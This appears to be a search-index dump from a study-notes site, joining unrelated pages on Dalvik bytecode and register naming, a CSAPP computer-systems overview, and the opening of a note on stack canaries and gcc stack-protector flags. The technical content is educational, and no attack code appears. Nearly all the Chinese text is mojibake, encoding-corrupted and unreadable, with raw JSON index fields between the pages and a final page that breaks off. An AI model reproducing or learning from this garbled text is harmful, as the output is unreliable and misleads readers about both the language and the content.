è™šæ‹Ÿæœºå¦‚ä½•è™šæ‹Ÿåœ°ä½¿ç”¨å¯„å­˜å™¨å‘¢ï¼Ÿ\n  æ¯ä¸ªå‡½æ•°åœ¨å‡½æ•°å¤´å£°æ˜å…¶ä½¿ç”¨çš„å¯„å­˜å™¨æ•°é‡ï¼Œè™šæ‹Ÿæœºæ‰§è¡Œåˆ°è¿™ä¸ªå‡½æ•°æ—¶ï¼Œæ ¹æ®å…¶å¯„å­˜å™¨çš„æ•°ç›®åˆ†é…é€‚å½“çš„æ ˆç©ºé—´ï¼Œç”¨æ¥å­˜æ”¾å¯„å­˜å™¨å®é™…çš„å€¼ï¼›\n  è™šæ‹Ÿæœºé€šè¿‡å¤„ç†å­—èŠ‚ç ï¼Œå¯¹å¯„å­˜å™¨è¿›è¡Œè¯»å†™æ“ä½œå°±æ˜¯åœ¨å†™æ ˆç©ºé—´ï¼ŒAndroid SDK ä¸­æœ‰ä¸€ä¸ªåä¸º dalvik.bytecode.Opcodes çš„æ¥å£ï¼Œå®ƒå®šä¹‰äº†ä¸€ä»½å®Œæ•´çš„ Dalvik å­—èŠ‚ç åˆ—è¡¨\nå¤„ç†è¿™äº›å­—èŠ‚ç çš„å‡½æ•°ä¸ºä¸€ä¸ªå® HANDLE_OPCODE()ï¼Œå¤„ç†è¿‡ç¨‹å‡½æ•°å¯ä»¥åœ¨ Android æºä»£ç  dalvik/vm/mterp/c ä¸­æ‰¾åˆ°ã€‚\n  ä¸‹é¢ä»¥ OP_MOVE.cpp ä¸¾ä¾‹ï¼š\n// vm/mterp/c/OP_MOVE.cpp HANDLE_OPCODE($opcode /*vA, vB*/)  vdst = INST_A(inst);  vsrc1 = INST_B(inst);  ILOGV(\u0026#34;|move%s v%d,v%d %s(v%d=0x%08x)\u0026#34;,  (INST_INST(inst) == OP_MOVE) ? \u0026#34;\u0026#34; : \u0026#34;-object\u0026#34;, vdst, vsrc1,  kSpacing, vdst, GET_REGISTER(vsrc1));  SET_REGISTER(vdst, GET_REGISTER(vsrc1));  FINISH(1); OP_END   vdst = INST_A(inst); vsrc1 = INST_B(inst); INST_A è¡¨ç¤ºç”¨æ¥è·å– vA å¯„å­˜å™¨åœ°å€çš„å®ï¼Œå…¶ä¸­ A è¡¨ç¤ºå¯„å­˜å™¨çš„â€åç§°â€œï¼Œå¯ä»¥æ˜¯å…¶ä»–çš„å­—æ¯æˆ–é•¿åº¦ã€‚åœ¨è¯¥æ–‡ä»¶çš„åŒç›®å½•ä¸‹çš„ headers.cpp æ–‡ä»¶ 300~304 ä¸­ï¼ŒINST_A ä¸ INST_B çš„å£°æ˜å¦‚ä¸‹ï¼š\n/* * Extract the \u0026#34;vA, vB\u0026#34; 4-bit registers from the instruction word (_inst is u2). */ #define INST_A(_inst) (((_inst) \u0026gt;\u0026gt; 8) \u0026amp; 0x0f) #define INST_B(_inst) ((_inst) \u0026gt;\u0026gt; 12) ä¹Ÿå°±æ˜¯è¯´ï¼Œvdst è·å–äº† _inst é«˜ 8 ä½çš„ä½ 4 ä½çš„å€¼ï¼›vsrc1 è·å–äº† _inst çš„æœ€é«˜ 4 ä½ã€‚\n  ILOGV(\u0026#34;|move%s v%d,v%d %s(v%d=0x%08x)\u0026#34;,  (INST_INST(inst) == OP_MOVE) ? \u0026#34;\u0026#34; : \u0026#34;-object\u0026#34;, vdst, vsrc1,  kSpacing, vdst, GET_REGISTER(vsrc1)); ç”¨æ¥è¾“å‡ºè°ƒè¯•ä¿¡æ¯ã€‚\n  SET_REGISTER(vdst, GET_REGISTER(vsrc1)); SET_REGISTER ç”¨æ¥è®¾ç½®å¯„å­˜å™¨çš„å€¼ï¼ŒGET_REGISTER ç”¨æ¥è·å–å¯„å­˜å™¨çš„å€¼ï¼ˆæ“ä½œçš„å¯„å­˜å™¨å¯ä»¥æ˜¯å…¶å®ƒçš„å¤§å°ä¸ç±»å‹ï¼Œæ¯”å¦‚ WIDE ç±»å‹ç›¸å…³çš„å®å‡½æ•°åˆ™æ˜¯ GET_REGISTER_WIDEï¼‰ã€‚åœ¨ headers.cpp æ–‡ä»¶ï¼Œå£°æ˜å¦‚ä¸‹ï¼š\n# define GET_REGISTER(_idx) \\ ( (_idx) \u0026lt; curMethod-\u0026gt;registersSize ? \\ (fp[(_idx)]) : (assert(!\u0026#34;bad reg\u0026#34;),1969) ) # define SET_REGISTER(_idx, _val) \\ ( (_idx) \u0026lt; curMethod-\u0026gt;registersSize ? \\ (fp[(_idx)] = (u4)(_val)) : (assert(!\u0026#34;bad reg\u0026#34;),1969) ) fp ä¸º ARM æ ˆå¸§å¯„å­˜å™¨ï¼Œåœ¨è™šæ‹Ÿæœºè¿è¡Œåˆ°æŸä¸ªå‡½æ•°æ—¶æŒ‡å‘å‡½æ•°çš„å±€éƒ¨å˜é‡åŒºï¼Œå…¶ä¸­å°±ç»´æŠ¤ç€ä¸€ä»½å¯„å­˜å™¨å€¼çš„åˆ—è¡¨ã€‚\n  v å‘½åæ³•ä¸ p å‘½åæ³• #  å‡è®¾ä¸€ä¸ªå‡½æ•°æœ‰ M ä¸ªå¯„å­˜å™¨å’Œ N ä¸ªå‚æ•°ï¼Œåˆ™å¯„å­˜å™¨å‘½åæ³•å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š\n   v å‘½åæ³• p å‘½åæ³• å¯„å­˜å™¨å«ä¹‰     v0 v0 ç¬¬ 1 ä¸ªå±€éƒ¨å˜é‡å¯„å­˜å™¨   v1 v1 ç¬¬ 2 ä¸ªå±€éƒ¨å˜é‡å¯„å­˜å™¨   \u0026hellip; \u0026hellip; ã€‚ã€‚ã€‚   v{M-N} p1 ç¬¬ 1 ä¸ªå‚æ•°å¯„å­˜å™¨   \u0026hellip; \u0026hellip; ã€‚ã€‚ã€‚   v{M-1} p{N-1} ç¬¬ N ä¸ªå¯„å­˜å™¨    ç±»å‹ã€æ–¹æ³•ä¸å­—æ®µè¡¨ç¤ºæ–¹æ³• #    ç±»å‹ã€‚\nDalvik å­—èŠ‚ç åªæœ‰ä¸¤ç§ç±»å‹ï¼ŒåŸºæœ¬ç±»å‹å’Œå¼•ç”¨ç±»å‹ã€‚Dalvik ä½¿ç”¨è¿™ä¸¤ç§ç±»å‹æ¥è¡¨ç¤º Java è¯­è¨€çš„å…¨éƒ¨ç±»å‹ï¼Œé™¤äº†å¯¹è±¡å’Œæ•°ç»„æ˜¯å¼•ç”¨å¯¹è±¡ç±»å‹ä¹‹å¤–ï¼Œå…¶ä»–çš„ Java ç±»å‹å…¨éƒ½æ˜¯åŸºæœ¬ç±»å‹ã€‚å…¨éƒ¨çš„ç±»å‹åˆ—è¡¨å¦‚ä¸‹ï¼š\n å¯¹äº 32 ä½çš„ç±»å‹æ¥è¯´ï¼Œä¸€ä¸ªå¯„å­˜å™¨å°±å¯ä»¥å­˜æ”¾è¯¥ç±»å‹çš„å€¼ï¼›è€Œåƒ Jã€D è¿™æ ·ç­‰ 64 ä½çš„ç±»å‹åˆ™æ˜¯ç”¨ä¸¤ä¸ªå“é“ƒçš„å¯„å­˜å™¨æ¥å­˜å‚¨çš„ï¼Œæ¯”å¦‚ v0 å’Œ v1ã€‚ L ç±»å‹å¯ä»¥è¡¨ç¤º Java ä¸­çš„ä»»ä½•ç±»ï¼Œè¿™äº›ç±»åœ¨ Java ä»£ç ä¸­ä»¥ package.name.ObjectName æ–¹å¼å¼•ç”¨ï¼Œåœ¨ Dalvik æ±‡ç¼–ä»£ç ä¸­ï¼Œä»¥ Lpackage/name/ObjectName; å½¢å¼è¡¨ç¤ºï¼ˆæ³¨æ„æœ€åæœ‰ä¸ªåˆ†å·ï¼‰ [ ç±»å‹è¡¨ç¤ºæ‰€æœ‰åŸºæœ¬ç±»å‹çš„æ•°ç»„ï¼Œ[ åé¢ç´§è·ŸåŸºæœ¬ç±»å‹æè¿°ç¬¦ï¼Œæ¯”å¦‚ [I è¡¨ç¤ºä¸€ä¸ªæ•´å‹ä¸€ä½æ•°ç»„ã€[[I è¡¨ç¤º int[][]ã€‚ [ å’Œ L åŒæ—¶ä½¿ç”¨å°±å¯ä»¥è¡¨ç¤ºå¯¹è±¡æ•°ç»„ã€‚    æ–¹æ³•ã€‚\nDalvik ä½¿ç”¨æ–¹æ³•åã€ç±»å‹å‚æ•°ä¸è¿”å›å€¼æ¥è¯¦ç»†æè¿°ä¸€ä¸ªæ–¹æ³•ã€‚æ–¹æ³•æ ¼å¼ä¾‹å­å¦‚ä¸‹ï¼š\nLpackage/name/Objectname;-\u0026gt;MethodName(III)Z   Lpackage/name/Objectname; è¡¨ç¤ºä¸€ä¸ªç±»å‹ï¼›\n  MethodName è¡¨ç¤ºæ–¹æ³•åï¼›\n  III è¡¨ç¤ºæ–¹æ³•çš„å‚æ•°ï¼Œåœ¨æ­¤ä½ä¸‰ä¸ªæ•´å½¢å‚æ•°ï¼›\n  Z è¡¨ç¤ºæ–¹æ³•çš„è¿”å›ç±»å‹ï¼ŒZ ä¸º boolean ç±»å‹ã€‚\nBakSmali ç”Ÿæˆçš„æ–¹æ³•ä»£ç ä»¥ .method æŒ‡ä»¤å¼€å§‹ï¼Œä»¥ .end method æŒ‡ä»¤ç»“æŸï¼Œæ ¹æ®ç”Ÿæˆçš„æ–¹æ³•ç±»å‹ä¸åŒï¼Œåœ¨æ–¹æ³•æŒ‡ä»¤å¼€å§‹å‰ä¼šç”¨ â€#â€œ åŠ ä»¥è§£é‡Šã€‚å¦‚ï¼š# virtual methods è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªè™šæ–¹æ³•ã€‚\n    å­—æ®µã€‚æ–¹æ³•æ ¼å¼ä¾‹å­å¦‚ä¸‹ï¼š\nLpackage/name/ObjectName-\u0026gt;FieldName:Ljava/lang/Strng; å­—æ®µç”±ç±»å‹ï¼ˆLpackage/name/ObjectName;ï¼‰ã€å­—æ®µåï¼ˆFieldNameï¼‰ä¸å­—æ®µç±»å‹ï¼ˆLjava/lang/String;ï¼‰ç»„æˆã€‚å…¶ä¸­åä¸¤è€…ç”¨ : éš”å¼€ã€‚\nBakSmali ç”Ÿæˆçš„æ–¹æ³•ä»£ç ä»¥ .field æŒ‡ä»¤å¼€å¤´ï¼Œæ ¹æ®ç”Ÿæˆçš„æ–¹æ³•ç±»å‹ä¸åŒï¼Œåœ¨æ–¹æ³•æŒ‡ä»¤å¼€å§‹å‰ä¼šç”¨ \u0026ldquo;#\u0026rdquo; åŠ ä»¥è§£é‡Šã€‚æ¯”å¦‚ï¼š# instance field è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå®ä¾‹å­—æ®µã€‚\n  Dalvik æŒ‡ä»¤é›† #  æŒ‡ä»¤ç‰¹ç‚¹ #  Dalvik æŒ‡ä»¤åœ¨è°ƒç”¨æ ¼å¼ä¸Šæ¨¡ä»¿äº† C è¯­è¨€çš„è°ƒç”¨çº¦å®šã€‚Dalvik æŒ‡ä»¤çš„è¯­æ³•ä¸åŠ©è®°ç¬¦æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š\n  å‚æ•°é‡‡ç”¨ä»ç›®æ ‡ï¼ˆdestinationï¼‰åˆ°æºï¼ˆsourceï¼‰çš„æ–¹å¼ï¼›\n  æ ¹æ®å­—èŠ‚ç çš„å¤§å°ä¸ç±»å‹ä¸åŒï¼Œä¸€äº›å­—èŠ‚ç æ·»åŠ äº†åç§°åç¼€ä»¥æ¶ˆé™¤æ­§ä¹‰ï¼š\n  32 ä½æ²¡æœ‰åç¼€ï¼›\n  64 ä½å¸¸è§„ç±»å‹çš„å­—èŠ‚ç æ·»åŠ  -wide åç¼€ï¼›\n  ç‰¹æ®Šç±»å‹çš„å­—èŠ‚ç æ ¹æ®å…·ä½“ç±»å‹æ·»åŠ åç¼€ã€‚\nå¯èƒ½å€¼ä¸ºï¼š -booleanã€-byteã€-charã€-shortã€-intã€-longã€-floatã€-doubleã€-objectã€-stringã€-classã€-voidã€‚\n    æ ¹æ®å­—èŠ‚ç çš„å¸ƒå±€ä¸é€‰é¡¹ä¸åŒï¼Œä¸€äº›å­—èŠ‚ç æ·»åŠ äº†å­—èŠ‚ç åç¼€ä»¥æ¶ˆé™¤æ­§ä¹‰ã€‚è¿™äº›åç¼€é€šè¿‡åœ¨å­—èŠ‚ç ä¸»åç§°åæ·»åŠ  / æ¥åˆ†éš”ã€‚\n  åœ¨æŒ‡ä»¤é›†çš„æè¿°ä¸­ï¼Œå®½åº¦å€¼ä¸­çš„æ¯ä¸ªå­—æ¯è¡¨ç¤ºå®½åº¦ä¸º 4 ä½ã€‚\n  æ¯”å¦‚è¿™æ ·ä¸€ä¸ªæŒ‡ä»¤ï¼šmove-wide/from16 vAA vBBBB\n move è¡¨ç¤ºåŸºç¡€å­—èŠ‚ç ï¼ˆbase opcodeï¼‰ï¼šæ ‡è¯†è¿™æ˜¯åŸºæœ¬æ“ä½œï¼› wide ä¸ºåç§°åç¼€ï¼ˆname suffixï¼‰ï¼šæ ‡è¯†æ•°æ®å®½åº¦æ˜¯ 64ï¼› from16 ä¸ºå­—èŠ‚ç åç¼€ï¼ˆopcode suffixï¼‰ï¼šæ ‡è¯†æ“ä½œæºæ˜¯ä¸€ä¸ª 16 ä½çš„å¯„å­˜å™¨å¼•ç”¨å¸¸é‡ï¼› vAA ä¸ºç›®çš„å¯„å­˜å™¨ï¼Œå§‹ç»ˆåœ¨æºä¹‹å‰ï¼Œè¡¨ç¤º 8 ä½ï¼Œå–å€¼èŒƒå›´æ˜¯ v0~v255ï¼› vBBBB ä¸ºæºå¯„å­˜å™¨ï¼Œè¡¨ç¤º 16 ä½ï¼Œå–å€¼èŒƒå›´æ˜¯ v0~v65535ã€‚  æ³¨æ„ï¼š\nDalvik è™šæ‹Ÿæœºä¸­çš„æ¯ä¸ªè™šæ‹Ÿæœºéƒ½æ˜¯ 32 ä½çš„ï¼Œæè¿°æŒ‡ä»¤ä¸­è¯´çš„ä½æ•°è¡¨ç¤ºä¸‹æ ‡å–å€¼èŒƒå›´ã€‚\næŒ‡ä»¤ #    ç©ºæŒ‡ä»¤ï¼šåŠ©è®°ç¬¦ä¸º nopï¼Œå®ƒçš„å€¼ä¸º 00ï¼Œæ— å®é™…ç”¨é€”ã€‚\n  æ•°æ®æ“ä½œæŒ‡ä»¤ï¼šæ•°æ®æ“ä½œæŒ‡ä»¤ä¸º moveã€‚æŒ‡ä»¤åŸå‹ä¸º move destination sourceï¼Œä¼šæ ¹æ®å­—èŠ‚ç çš„å¤§å°ä¸ç±»å‹ä¸åŒï¼Œåé¢ä¼šè·Ÿä¸Šä¸åŒçš„åç¼€ã€‚\n  è¿”å›æŒ‡ä»¤ï¼šå‡½æ•°ç»“å°¾è¿è¡Œçš„æœ€åä¸€æ¡æŒ‡ä»¤ã€‚å®ƒçš„åŸºç¡€å­—èŠ‚ç ä¸º returnï¼Œå…±æœ‰ä»¥ä¸‹å››æ¡æŒ‡ä»¤ï¼š\n return-void è¡¨ç¤ºå‡½æ•°ä»ä¸€ä¸ª void æ–¹æ³•è¿”å›ï¼› return vAA è¡¨ç¤ºå‡½æ•°è¿”å›ä¸€ä¸ª 32 ä½éå¯¹è±¡ç±»å‹çš„å€¼ï¼› return-wide vAA è¡¨ç¤ºå‡½æ•°è¿”å›ä¸€ä¸ª 64 ä½è´¹å¯¹è±¡ç±»å‹çš„å€¼ï¼› return-object vAA è¡¨ç¤ºå‡½æ•°è¿”å›ä¸€ä¸ªå¯¹è±¡ç±»å‹çš„å€¼ï¼›    æ•°æ®å®šä¹‰æŒ‡ä»¤ï¼šç”¨æ¥å®šä¹‰ç¨‹åºä¸­ç”¨åˆ°çš„å¸¸é‡ã€å­—ç¬¦ä¸²ã€ç±»ç­‰æ•°æ®ã€‚å®ƒçš„åŸºç¡€å­—èŠ‚ç ä¸º constã€‚\næ¯”å¦‚ï¼šconst-wide/16 vAA, #+BBBB è¡¨ç¤ºå°† 16 ä½çš„æ•°å­—æ‰©å±•ä¸º 64 ä½åèµ‹å€¼ç»™å¯„å­˜å™¨ vAAã€‚\n  é”æŒ‡ä»¤ï¼šDalvik ä¸­æœ‰ä¸¤æ¡é”æŒ‡ä»¤ï¼šmonitor-enter vAA ä¸ºæŒ‡å®šçš„å¯¹è±¡è·å–é”ï¼Œmonitor-exit vAA é‡Šæ”¾æŒ‡å®šå¯¹è±¡çš„é”ã€‚\n  å®ä¾‹æ“ä½œæŒ‡ä»¤ï¼šä¸å®ä¾‹æ“ä½œç›¸å…³çš„æ“ä½œåŒ…æ‹¬ç±»å‹è½¬æ¢ã€æ£€æŸ¥ä¸æ–°å»ºç­‰ã€‚\n check-cast vAA, type@BBBBï¼šå°† vAA å¯„å­˜å™¨ä¸­çš„å¯¹è±¡è½¬æ¢ä¸ºæŒ‡å®šçš„ç±»å‹ï¼Œå¦‚æœå¤±è´¥ä¼šæŠ›å‡º ClassCastException å¼‚å¸¸ã€‚ instance-of vA, vB, type@CCCCï¼šåˆ¤æ–­ vB å¯„å­˜å™¨ä¸­çš„å¯¹è±¡æ˜¯å¦å¯ä»¥è½¬æ¢ä¸ºæŒ‡å®šçš„ç±»å‹ï¼Œå¦‚æœå¯ä»¥åˆ™å°†å¯„å­˜å™¨ vA èµ‹å€¼ä¸º 1ï¼Œå¦åˆ™èµ‹å€¼ä¸º 0ã€‚ new-instance vAA, type@BBBBï¼šæ„é€ ä¸€ä¸ªæŒ‡å®šç±»å‹å¯¹è±¡çš„æ–°å®ä¾‹ï¼Œå¹¶å°†å¯¹è±¡å¼•ç”¨èµ‹å€¼ç»™ vAA å¯„å­˜å™¨ï¼Œç±»å‹ç¬¦ type æŒ‡å®šçš„ç±»å‹ä¸èƒ½æ˜¯æ•°ç»„ç±»å‹ã€‚    æ•°ç»„æ“ä½œæŒ‡ä»¤ï¼šåŒ…æ‹¬è·å–æ•°ç»„é•¿åº¦ã€æ–°å»ºæ•°ç»„ã€æ•°ç»„èµ‹å€¼ã€æ•°ç»„å…ƒç´ å–å€¼ä¸èµ‹å€¼ç­‰æ“ä½œã€‚\n  å¼‚å¸¸æŒ‡ä»¤ï¼šDalvik ä¸­ç”¨ throw vAA æŒ‡ä»¤æ¥æŠ›å‡º vAA å¯„å­˜å™¨ä¸­çš„å¼‚å¸¸ã€‚\n  è·³è½¬æŒ‡ä»¤ï¼šDalvik æŒ‡ä»¤é›†ä¸­æœ‰ä¸‰ç§è·³è½¬æŒ‡ä»¤ï¼šæ— æ¡ä»¶è·³è½¬ï¼ˆgotoï¼‰ã€åˆ†æ”¯è·³è½¬ï¼ˆswitchï¼‰ä¸æ¡ä»¶è·³è½¬ï¼ˆifï¼‰\n  æ¯”è¾ƒæŒ‡ä»¤ï¼šå®ƒçš„æ ¼å¼ä¸º cmpkind vAA, vBB, vCCï¼Œå…¶ä¸­ vBB ä¸ vCC æ˜¯ä¸¤ä¸ªå¾…æ¯”è¾ƒçš„å¯„å­˜å™¨å¯¹ï¼ŒvAA æ˜¯å­˜æ”¾æ¯”è¾ƒç»“æœçš„å¯„å­˜å™¨ã€‚\n  å­—æ®µæ“ä½œæŒ‡ä»¤ï¼šå­—æ®µæ“ä½œæŒ‡ä»¤ç”¨æ¥å¯¹å¯¹è±¡å®ä¾‹çš„å­—æ®µè¿›è¡Œè¯»å†™æ“ä½œã€‚å­—æ®µçš„ç±»å‹å¯ä»¥æ˜¯ Java ä¸­æœ‰æ•ˆçš„æ•°æ®ç±»å‹ã€‚\nå¯¹æ™®é€šå­—æ®µå’Œé™æ€å­—æ®µæœ‰ä¸¤ç§æŒ‡ä»¤é›†ï¼šiinstanceop vA,vB, field@CCCC ä¸ sstaticop vAA, field@BBBBï¼›\næ™®é€šå­—æ®µæŒ‡ä»¤çš„å‰ç¼€ä¸º iï¼Œæ¯”å¦‚æ™®é€šå­—æ®µè¯»æ“ä½œ igetï¼Œå†™æ“ä½œ iputï¼›\né™æ€å­—æ®µæŒ‡ä»¤å‰ç¼€ä¸º sï¼Œæ¯”å¦‚é™æ€å­—æ®µè¯»æ“ä½œ sgetï¼Œå†™æ“ä½œ sputã€‚\n  æ–¹æ³•è°ƒç”¨æŒ‡ä»¤ï¼šè´Ÿè´£è°ƒç”¨ç±»å®ä¾‹çš„æ–¹æ³•ï¼Œå®ƒçš„åŸºç¡€æŒ‡ä»¤ä¸º invokeï¼Œæ–¹æ³•è°ƒç”¨æŒ‡ä»¤æœ‰ invoke-kind {vC, vD, vE, vF, vG}, meth@BBBB ä¸ invoke-kind/range {vCCCC ... vNNNN}, meth@BBBB ä¸¤ç±»ã€‚ä¸¤ç±»æŒ‡ä»¤åœ¨ä½œç”¨ä¸Šå¹¶æ— ä¸åŒï¼Œåªæ˜¯åè€…ä½¿ç”¨äº† range æ¥æŒ‡å®šå¯„å­˜å™¨çš„èŒƒå›´ã€‚\n  æ•°æ®è½¬æ¢æŒ‡ä»¤ï¼šç”¨äºå°†ä¸€ç§ç±»å‹çš„æ•°å€¼è½¬æ¢ä¸ºå¦ä¸€ç§ç±»å‹ã€‚å®ƒçš„æ ¼å¼ä¸º unop vA, vBã€‚vB ä¸­å­˜æ”¾ç€éœ€è¦è½¬æ¢çš„æ•°æ®ï¼Œè½¬æ¢åçš„ç»“æœä¿å­˜åœ¨ vA ä¸­ã€‚\n  æ•°æ®è¿ç®—æŒ‡ä»¤ï¼šåŒ…æ‹¬ç®—æœ¯è¿ç®—ï¼ˆåŠ ã€å‡ã€ä¹˜ã€é™¤ã€æ¨¡ã€ç§»ä½ç­‰ï¼‰ä¸é€»è¾‘è¿ç®—ï¼ˆä¸ã€æˆ–ã€éã€å¼‚æˆ–ç­‰ï¼‰\n  "},{"id":186,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/android%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/4.android%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/","title":"4. Androidå¯æ‰§è¡Œæ–‡ä»¶","section":"Androidé€†å‘åˆ†æ","content":"Android å¯æ‰§è¡Œæ–‡ä»¶ #  Android ç¨‹åºçš„ç”Ÿæˆæ­¥éª¤ #  Google æä¾›äº† Android SDK ä¾›ç¨‹åºå‘˜æ¥å¼€å‘ Android å¹³å°çš„è½¯ä»¶ã€‚æ¯ä¸ªè½¯ä»¶åœ¨æœ€ç»ˆå‘å¸ƒæ—¶ä¼šæ‰“åŒ…æˆä¸€ä¸ª apk æ–‡ä»¶ï¼Œå°† apk æ–‡ä»¶ ä¼ é€åˆ° Android è®¾å¤‡ä¸­è¿è¡Œå³å¯å®‰è£…ã€‚\n"},{"id":187,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/csapp/1.tour/","title":"1. Tour","section":"CSAPP","content":"Tour of Computer-Systems #  Compilation #  Compiler: Program are translated into different forms.\nA classic compiler work in following sequence:\n Preprocessing Phase: Source program (hello.c) $$\\Rightarrow$$ Pre-Processor (cpp) $\\Rightarrow$ Modified source program (hello.i). Compilation Phase: Compiler (cc1) $$\\Rightarrow$$ Assembly program (hello.s). Assembly Phase: Assembler (as) $$\\Rightarrow$$ Relocatable object programs (hello.o). Linking Phase: Linker (ld) $$\\Rightarrow$$ Executable object program (hello)  We need to understand compilation systems work:\n Optimizing program performance; Understanding link-time errors; Avoiding security holes;  Hardware Organization #  Buses (æ€»çº¿):\n Buses are typically designed to transfer fixed-sized chunks of bytes known as word; ä¸€ä¸ª word çš„é•¿åº¦æ˜¯è®¡ç®—æœºç³»ç»Ÿçš„åŸºæœ¬åº¦é‡å•ä½ï¼Œå¤§å¤šæ•°ç°ä»£æœºå™¨éƒ½æ˜¯ 4 bytes (32-bits machine) æˆ– 8 bytes (64-bits machine);  I/O Devices (IO è®¾å¤‡):\n Each I/O device is connected to the I/O bus by either a controller or an adapter:  controllers: chip sets in the device itself or on the motherboard; adapter: a card that plugs into a slot on the motherboard;    Main Memory (ä¸»å­˜):\n Main memory consists of a collection of dynamic random access memory (DRAM) chips  Processor, central processing unit (CPU):\n CPU æ ¸å¿ƒç”±ä¸€ä¸ª word å¤§å°çš„å¯„å­˜å™¨ PC (program counter)ï¼Œå®ƒæŒ‡å‘ä¸»å­˜ä¸­çš„æŸä¸ªæœºå™¨æŒ‡ä»¤ã€‚ åˆ°ç›®å‰ä¸ºæ­¢ï¼Œå¤§éƒ¨åˆ†è®¡ç®—æœºéƒ½æ˜¯å•å¤„ç†å™¨æœºå™¨ï¼ˆwhich is known as a uniprocessor systemï¼‰ï¼Œç›¸å¯¹äºå¤šå¤„ç†å™¨æœºå™¨ï¼ˆmultiprocessor systemï¼‰ï¼Œç°åœ¨éƒ½æ˜¯ç”¨å¤šæ ¸å•å¤„ç†å™¨ç³»ç»Ÿã€‚  Storage Hierarchy #  L0: Register;\nL1: L1 cache, SRAM;\nL2: L2 cache, SRAM;\nL3: L3 cache, SRAM;\nL4: Main memory, DRAM;\nL5: Local secodary storage, local disks;\nL6: Remote secondary storage (distributed file systems, web servers);\nOperating System #  Parallelism #  å¹¶å‘ Concurrency ä¸å¹¶è¡Œ Prallelismï¼š\n We use the term concurrency to refer to the general concept of a system with multiple simultaneous activities. The term parallelism to refer to the use of concurrency to make a system run faster.  ä¸‰å±‚å¹¶è¡Œï¼Œé€šè¿‡ä¸‰ç§ä¸åŒç±»å‹çš„å¹¶å‘æŠ€æœ¯å®ç°ï¼š\n Thread-Level Concurrencyï¼šçº¿ç¨‹æ˜¯æ“ä½œç³»ç»Ÿè°ƒåº¦çš„åŸºæœ¬å•ä½ã€‚çº¿ç¨‹é—´çš„åˆ‡æ¢å¤§çº¦éœ€è¦ 20000 å·¦å³çš„æ—¶é’Ÿå‘¨æœŸï¼› Instruction-Level Parallelismï¼šæœ‰çš„å¤„ç†å™¨ä¸€ä¸ªæ—¶é’Ÿå‘¨æœŸå¯ä»¥å¤„ç†åŒæ—¶å¤„ç†å¤šä¸ªæŒ‡ä»¤ï¼ˆè¢«ç§°ä¸º superscalar processorsï¼‰ï¼ŒåŒæ—¶ç†è®ºä¸Šä¹Ÿå¯ä»¥é€šè¿‡æµæ°´çº¿è®¾è®¡æ¥å®ç°æŒ‡ä»¤çº§åˆ«çš„å¹¶è¡Œï¼› Single-Instruction Multiple-Data (SIMD) Parallelismï¼šæœ‰çš„å¤„ç†å™¨æä¾›äº†æ‰§è¡Œä¸€ä¸ªæŒ‡ä»¤ï¼Œå¾—åˆ°å¤šä¸ªè¾“å…¥æ•°æ®ç»“æœçš„åŠŸèƒ½ï¼Œæ¯”å¦‚æœ€æ–°çš„ AMD å’Œ Intel å¤„ç†å™¨éƒ½æä¾›äº†åŒæ—¶å¤„ç†å››å¯¹æµ®ç‚¹æ•°è¿ç®—çš„åŠŸèƒ½ã€‚  "},{"id":188,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/csapp/2.representandmanipulate/","title":"2. Represent and Manipulate","section":"CSAPP","content":"Respresenting and Manipulating Information #  "},{"id":189,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/ctf-wiki/7.1.stackoverflow/1.canary/","title":"1. Canary","section":"7.1.StackOverflow","content":" å­¦ä¹ èµ„æ–™ï¼š\n https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/Canary/ https://blog.csdn.net/Virtual_Func/article/details/48789947 http://blog.fourthbit.com/2014/12/23/traffic-analysis-of-an-ssl-slash-tls-session  å­¦ä¹ å†…å®¹ï¼š\n Linux-Pwnï¼Œå®‰å…¨ä¿æŠ¤æœºåˆ¶   Canary #  ç”±äº stack overflow è€Œå¼•å‘çš„æ”»å‡»éå¸¸æ™®éä¹Ÿéå¸¸å¤è€ï¼Œç›¸åº”åœ°ä¸€ç§å«åš canary çš„ mitigation æŠ€æœ¯å¾ˆæ—©å°±å‡ºç°åœ¨ glibc é‡Œï¼Œç›´åˆ°ç°åœ¨ä¹Ÿä½œä¸ºç³»ç»Ÿå®‰å…¨çš„ç¬¬ä¸€é“é˜²çº¿å­˜åœ¨ã€‚\n PostScriptï¼šglibcï¼šThe GNU C Library, commonly known as glibc, is the GNU Project\u0026rsquo;s implementation of the C standard library.  åŸç† #  canary ä¸ç®¡æ˜¯å®ç°è¿˜æ˜¯è®¾è®¡æ€æƒ³éƒ½æ¯”è¾ƒç®€å•é«˜æ•ˆï¼Œå°±æ˜¯æ’å…¥ä¸€ä¸ªå€¼ï¼Œåœ¨ stack overflow å‘ç”Ÿçš„ é«˜å±åŒºåŸŸçš„å°¾éƒ¨ï¼Œå½“å‡½æ•°è¿”å›ä¹‹æ—¶æ£€æµ‹ canary çš„å€¼æ˜¯å¦ç»è¿‡äº†æ”¹å˜ï¼Œä»¥æ­¤æ¥åˆ¤æ–­ stack/buffer overflow æ˜¯å¦å‘ç”Ÿã€‚\nPostScriptï¼šgcc ä¸­ä½¿ç”¨ï¼š\n$ gcc -fstack-protector test.c # å¯ç”¨ä¿æŠ¤ï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰æ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤  $ gcc -fstack-protector-all test.c # å¯ç”¨ä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤  $ gcc -fstack-protector-strong test.c  $ gcc -fstack-protector-explicit test.c # åªå¯¹æœ‰æ˜ç¡®stack_protect attributeçš„å‡½æ•°å¼€å¯ä¿æŠ¤  $ gcc -fno-stack-protector test.c # ç¦ç”¨ä¿æŠ¤ 